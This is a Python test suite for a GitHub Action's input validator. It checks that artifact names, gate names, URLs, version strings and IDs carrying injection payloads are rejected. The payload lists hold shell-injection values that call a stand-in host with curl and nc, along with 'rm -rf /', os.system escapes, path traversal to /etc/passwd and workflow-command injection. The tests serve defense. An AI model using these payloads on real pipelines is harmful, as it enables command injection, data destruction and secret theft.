"""TSK_157 — allow-list contract for action/validate_inputs.py.

The validator is the action's first-step gate against RES_154 P0 #3
(GitHub Actions script injection). These tests are exhaustively
parametrised on the *malicious-input matrix* — semicolon, backticks,
``$()``, newline, path traversal, etc. — so a future contributor who
relaxes the regex without thinking will break the suite immediately.

No network, no DB, no provider calls — pure stdlib validation logic.
"""

from __future__ import annotations

import os
import sys
import unittest
from pathlib import Path
from unittest import mock

# The validator lives one directory up, alongside the action.yml. Tests
# run from the repository root; insert the package path explicitly so
# the suite doesn't depend on cwd.
HERE = Path(__file__).resolve().parent
ACTION_DIR = HERE.parent
if str(ACTION_DIR) not in sys.path:
    sys.path.insert(0, str(ACTION_DIR))

import validate_inputs  # noqa: E402 — sys.path manipulation above
from validate_inputs import (  # noqa: E402
    ValidationError,
    validate_all,
    validate_api_url,
    validate_artifact_name,
    validate_bool,
    validate_fail_on,
    validate_gate,
    validate_python_version,
    validate_suite_id,
)


VALID_ENV: dict[str, str] = {
    "INPUT_SUITE_ID": "11111111-2222-3333-4444-555555555555",
    "INPUT_GATE": "baseline-agent-v1",
    "INPUT_FAIL_ON": "BLOCKED,NEEDS_FIXES,LOW_CONFIDENCE_CRITICAL",
    "INPUT_API_URL": "https://api.agentscore.tech",
    "INPUT_PYTHON_VERSION": "3.12",
    "INPUT_ARTIFACT_NAME": "agentscore-release-decision",
    "INPUT_INTEGRATION_ARTIFACT_NAME": "agentscore-release-integrations",
    "INPUT_COMMENT_ON_PR": "true",
    "INPUT_FAIL_WORKFLOW_ON_GATE": "true",
}


class _Positive(unittest.TestCase):
    """Healthy inputs pass without raising."""

    def test_validate_all_passes_on_default_inputs(self):
        # `validate_all` returns None on success.
        self.assertIsNone(validate_all(dict(VALID_ENV)))

    def test_validate_all_passes_on_uppercase_uuid(self):
        env = dict(VALID_ENV)
        env["INPUT_SUITE_ID"] = "AAAAAAAA-BBBB-CCCC-DDDD-EEEEEEEEEEEE"
        self.assertIsNone(validate_all(env))

    def test_validate_all_passes_for_full_python_version(self):
        env = dict(VALID_ENV)
        env["INPUT_PYTHON_VERSION"] = "3.12.4"
        self.assertIsNone(validate_all(env))

    def test_validate_all_accepts_http_local_only_when_opted_in(self):
        env = dict(VALID_ENV)
        env["INPUT_API_URL"] = "http://127.0.0.1:8000"
        env["INPUT_ALLOW_HTTP_LOCAL"] = "true"
        self.assertIsNone(validate_all(env))


# --------------------------------------------------------------------------- #
# artifact-name — the original RES_154 anchor (path traversal + shell metas) #
# --------------------------------------------------------------------------- #
class _MaliciousArtifactName(unittest.TestCase):
    """Every entry here was a documented GitHub Action script-injection
    payload before TSK_157. The validator must refuse all of them, even
    though the surrounding shell happens to quote them today."""

    _PAYLOADS = [
        # CWE-78 / shell metacharacters
        "agentscore;curl evil.tld",
        "agentscore`whoami`",
        "agentscore$(curl evil.tld)",
        "agentscore|nc evil.tld 4444",
        "agentscore&calc.exe",
        # Path traversal
        "../../etc/passwd",
        "foo/bar",
        "foo\\bar",
        "..\\..\\windows",
        ".. ",   # leading-trailing whitespace also caught by regex
        # Workflow-control sequences GitHub recognises in step output
        "agentscore\n::set-output name=token::leak",
        "agentscore\r::error::leaked",
        # JSON / Python-quote escape attempts that used to flow into
        # the inline python -c body
        "agentscore\"; __import__('os').system('rm -rf /'); \"",
        "agentscore'); __import__('os').system('whoami'); ('",
        # Unicode look-alikes / quoting characters
        "agentscore' --output=/tmp/x",
        "agentscore\"",
        # Empty / overlong
        "",
        "x" * 81,
    ]

    def test_artifact_name_rejects_payloads(self):
        for payload in self._PAYLOADS:
            with self.subTest(payload=repr(payload)):
                with self.assertRaises(ValidationError):
                    validate_artifact_name(payload)

    def test_integration_artifact_name_uses_same_contract(self):
        # Spot-check one payload through the field= alias.
        with self.assertRaises(ValidationError) as ctx:
            validate_artifact_name("foo$bar", field="integration-artifact-name")
        # Name surfaces; offending value never echoed.
        self.assertEqual(ctx.exception.args[0], "integration-artifact-name")


# --------------------------------------------------------------------------- #
# suite-id, gate, fail-on, api-url, python-version                           #
# --------------------------------------------------------------------------- #
class _MaliciousScalars(unittest.TestCase):
    def test_suite_id_rejects_non_uuid(self):
        for bad in [
            "not-a-uuid",
            "11111111-2222-3333-4444",
            "11111111-2222-3333-4444-5555555555555555",
            "11111111-2222-3333-4444-555555555555;DROP TABLE",
            "",
            None,
        ]:
            with self.subTest(bad=bad):
                with self.assertRaises(ValidationError):
                    validate_suite_id(bad)  # type: ignore[arg-type]

    def test_gate_rejects_shell_metacharacters(self):
        for bad in [
            "baseline$(whoami)",
            "baseline`id`",
            "baseline; rm -rf /",
            "baseline|nc evil",
            "baseline agent",  # whitespace
            "baseline/agent",
            "",
            "x" * 81,
        ]:
            with self.subTest(bad=bad):
                with self.assertRaises(ValidationError):
                    validate_gate(bad)

    def test_fail_on_rejects_unknown_signals(self):
        for bad in [
            "BLOCKED,EVIL",
            "BLOCKED,",
            ",BLOCKED",
            "BLOCKED, ; rm",
            "",
            "blocked",  # lowercase not allowed — strict allow-list
        ]:
            with self.subTest(bad=bad):
                with self.assertRaises(ValidationError):
                    validate_fail_on(bad)

    def test_fail_on_canonicalises_whitespace(self):
        self.assertEqual(
            validate_fail_on("BLOCKED, NEEDS_FIXES , LOW_CONFIDENCE_CRITICAL"),
            "BLOCKED,NEEDS_FIXES,LOW_CONFIDENCE_CRITICAL",
        )

    def test_api_url_rejects_http_by_default(self):
        for bad in [
            "http://api.agentscore.tech",
            "http://127.0.0.1",          # local but allow_http_local=False
            "ftp://api.agentscore.tech",
            "file:///etc/passwd",
            "javascript:alert(1)",
            "https://",                  # no host
            "https://api.example/$(curl)",
            "https://api.example`id`",
            "https://api.example\nFOO",
            "",
        ]:
            with self.subTest(bad=bad):
                with self.assertRaises(ValidationError):
                    validate_api_url(bad)

    def test_api_url_local_only_when_explicitly_opted_in(self):
        # opt-in flag accepts local but refuses non-local http
        self.assertEqual(
            validate_api_url("http://localhost:8000", allow_http_local=True),
            "http://localhost:8000",
        )
        with self.assertRaises(ValidationError):
            validate_api_url("http://example.com", allow_http_local=True)

    def test_python_version_rejects_non_versions(self):
        for bad in [
            "3.12; rm -rf /",
            "3.12 && curl",
            "$(whoami)",
            "3.12.4.5.6.7",   # too many dots
            "3.x",
            "3,12",
            "",
        ]:
            with self.subTest(bad=bad):
                with self.assertRaises(ValidationError):
                    validate_python_version(bad)


class _Booleans(unittest.TestCase):
    def test_only_exact_true_or_false(self):
        for ok in ["true", "false"]:
            self.assertEqual(validate_bool(ok, field="comment-on-pr"), ok)
        for bad in ["True", "FALSE", "yes", "no", "1", "0", "", " true", "true\n"]:
            with self.subTest(bad=bad):
                with self.assertRaises(ValidationError):
                    validate_bool(bad, field="comment-on-pr")


# --------------------------------------------------------------------------- #
# CLI entry point                                                            #
# --------------------------------------------------------------------------- #
class _MainEntrypoint(unittest.TestCase):
    """Behaviour observable from ``python -m validate_inputs``."""

    def test_main_returns_zero_on_valid_env(self):
        with mock.patch.dict(os.environ, VALID_ENV, clear=True):
            self.assertEqual(validate_inputs.main([]), 0)

    def test_main_returns_two_on_invalid_env_and_does_not_echo_value(self):
        env = dict(VALID_ENV)
        # Choose a payload with workflow-control bytes so we can assert
        # they NEVER appear in stderr.
        env["INPUT_ARTIFACT_NAME"] = "evil\n::set-output name=token::leak"
        stderr = []
        with mock.patch.dict(os.environ, env, clear=True), mock.patch(
            "sys.stderr"
        ) as fake_stderr:
            fake_stderr.write = lambda chunk: stderr.append(chunk)
            rc = validate_inputs.main([])
        self.assertEqual(rc, 2)
        joined = "".join(stderr)
        # The bounded error mentions the input name but never the bytes.
        self.assertIn("artifact-name", joined)
        self.assertNotIn("set-output", joined)
        self.assertNotIn("leak", joined)

    def test_main_returns_two_on_missing_required(self):
        env = dict(VALID_ENV)
        env.pop("INPUT_SUITE_ID")
        with mock.patch.dict(os.environ, env, clear=True):
            self.assertEqual(validate_inputs.main([]), 2)


if __name__ == "__main__":  # pragma: no cover
    unittest.main()


# TSK_1065 — start a run from CI (agent-id) or read a finished one (suite-id).
class TestRunTarget:
    def test_exactly_one_of_suite_or_agent(self):
        from validate_inputs import ValidationError, validate_run_target

        uid = "11111111-2222-3333-4444-555555555555"
        validate_run_target({"INPUT_SUITE_ID": uid})
        validate_run_target({"INPUT_AGENT_ID": uid, "INPUT_RUN_KEY": "sha-0123abcd"})
        for bad in ({}, {"INPUT_SUITE_ID": uid, "INPUT_AGENT_ID": uid}):
            try:
                validate_run_target(bad)
            except ValidationError:
                continue
            raise AssertionError(f"accepted {bad}")

    def test_agent_id_and_run_key_are_constrained(self):
        from validate_inputs import ValidationError, validate_run_target

        uid = "11111111-2222-3333-4444-555555555555"
        for env in ({"INPUT_AGENT_ID": "x;rm -rf"}, {"INPUT_AGENT_ID": uid, "INPUT_RUN_KEY": "a b$(id)"}):
            try:
                validate_run_target(env)
            except ValidationError:
                continue
            raise AssertionError(f"accepted {env}")
